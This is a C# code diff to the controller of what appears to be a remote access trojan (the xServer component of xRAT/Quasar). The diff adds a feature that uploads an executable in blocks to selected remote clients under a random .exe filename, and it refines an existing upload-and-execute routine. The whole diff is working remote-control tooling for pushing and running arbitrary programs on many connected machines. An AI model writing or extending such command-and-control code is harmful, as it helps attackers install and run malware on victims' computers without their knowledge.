@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core;
@@ -336,10 +337,60 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        if (Core.Misc.Update.UseDownload)
                         {
-                            Client c = (Client) lvi.Tag;
-                            new Core.Packets.ServerPackets.Update(Core.Misc.Update.DownloadURL).Execute(c);
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client)lvi.Tag;
+                                new Core.Packets.ServerPackets.Update(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                            }
+                        }
+                        else
+                        {
+                            new Thread(() =>
+                            {
+                                List<Client> clients = new List<Client>();
+
+                                this.lstClients.Invoke((MethodInvoker) delegate
+                                {
+                                    clients.AddRange(from ListViewItem item in lstClients.SelectedItems select (Client)item.Tag);
+                                });
+
+                                bool error = false;
+                                foreach (Client c in clients)
+                                {
+                                    if (c == null) continue;
+                                    if (error) continue;
+
+                                    FileSplit srcFile = new FileSplit(Core.Misc.Update.UploadPath);
+                                    var fileName = Helper.GetRandomFilename(8, ".exe");
+                                    if (srcFile.MaxBlocks < 0)
+                                    {
+                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                        error = true;
+                                        break;
+                                    }
+
+                                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)
+
+                                    CommandHandler.HandleStatus(c,
+                                        new Core.Packets.ClientPackets.Status("Uploading file..."));
+
+                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                                    {
+                                        byte[] block;
+                                        if (!srcFile.ReadBlock(currentBlock, out block))
+                                        {
+                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
+                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                            error = true;
+                                            break;
+                                        }
+                                        new Core.Packets.ServerPackets.Update(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+                                    }
+                                }
+                            }).Start();
                         }
                     }
                 }
@@ -557,21 +608,21 @@ namespace xServer.Forms
 
                             this.lstClients.Invoke((MethodInvoker)delegate
                             {
-                                foreach (ListViewItem item in lstClients.SelectedItems)
-                                {
-                                    clients.Add((Client)item.Tag);
-                                }
+                                clients.AddRange(from ListViewItem item in lstClients.SelectedItems select (Client)item.Tag);
                             });
 
+                            bool error = false;
                             foreach (Client c in clients)
                             {
                                 if (c == null) continue;
+                                if (error) continue;
 
                                 FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                 if (srcFile.MaxBlocks < 0)
                                 {
                                     MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                         "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                    error = true;
                                     break;
                                 }
 
@@ -587,6 +638,7 @@ namespace xServer.Forms
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                             "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                                        error = true;
                                         break;
                                     }
                                     new Core.Packets.ServerPackets.UploadAndExecute(ID,
